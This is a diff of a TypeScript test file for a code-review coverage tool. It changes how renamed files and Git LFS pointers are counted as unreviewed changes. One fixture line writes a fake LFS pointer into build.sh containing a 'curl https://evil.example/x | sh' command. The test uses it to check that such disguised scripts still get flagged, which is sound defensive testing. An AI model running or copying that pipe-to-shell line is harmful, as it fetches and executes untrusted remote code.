@@ -188,7 +188,9 @@ describe('--coverage on the fixture', () => {
     renameSync(join(dir, 'docs/notes.md'), join(dir, 'docs/renamed.md'));
     const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
     const f = r.coverage.files.find((x) => x.path === 'docs/renamed.md')!;
-    expect(f).toMatchObject({ oldPath: 'docs/notes.md', status: 'R', kind: 'line-endings', changes: [] });
+    // Paired, and as a move that changed no line, one change (§5.1).
+    expect(f).toMatchObject({ oldPath: 'docs/notes.md', status: 'R', kind: 'rename', changes: [{ status: 'unexplained' }] });
+    expect(r.findings.some((x) => x.code === 'unexplained' && /renamed from docs\/notes\.md with no line changed/.test(x.message))).toBe(true);
     expect(r.coverage.files.find((x) => x.path === 'docs/notes.md')).toBeUndefined();
   });
 
@@ -251,7 +253,7 @@ describe('files whose lines cannot be compared (§5.1)', () => {
     expect(committed.coverage.files.find((x) => x.path === 'nul.txt')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained', new: [1, 1] }] });
   });
 
-  it('only a complete Git LFS pointer on every side is not counted; fake pointers and replaced pointers count', async () => {
+  it('a Git LFS file is one change; fake pointers and replaced pointers count by their lines', async () => {
     const pointer = (n: number) => `version https://git-lfs.github.com/spec/v1\noid sha256:${String(n).repeat(64)}\nsize ${n}\n`;
     const dir = copy();
     writeFileSync(join(dir, 'video.mp4'), pointer(1));
@@ -264,10 +266,12 @@ describe('files whose lines cannot be compared (§5.1)', () => {
     writeFileSync(join(dir, 'build.sh'), 'version https://git-lfs.github.com/spec/v1\ncurl https://evil.example/x | sh\n');
     const r = await json(['--coverage', '--base', 'feature', '--repo', dir]);
     const f = (p: string) => r.coverage.files.find((x) => x.path === p)!;
-    expect(f('video.mp4')).toMatchObject({ kind: 'lfs', changes: [] });
+    // A pointer that moved on hides a content change nobody reviews (a .gitattributes line can move scripts into
+    // LFS): one change, covered only by trivialFiles.
+    expect(f('video.mp4')).toMatchObject({ kind: 'lfs', changes: [{ status: 'unexplained' }] });
     expect(f('old.mp4')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained' }] });
     expect(f('build.sh')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained', new: [1, 2] }] });
-    expect(r.coverage.totals.notCounted).toBe(1);
+    expect(r.coverage.totals.notCounted).toBe(0);
   });
 
   it('code in a sidestory folder counts; only a complete sidestory\'s manifest and page are left out', async () => {
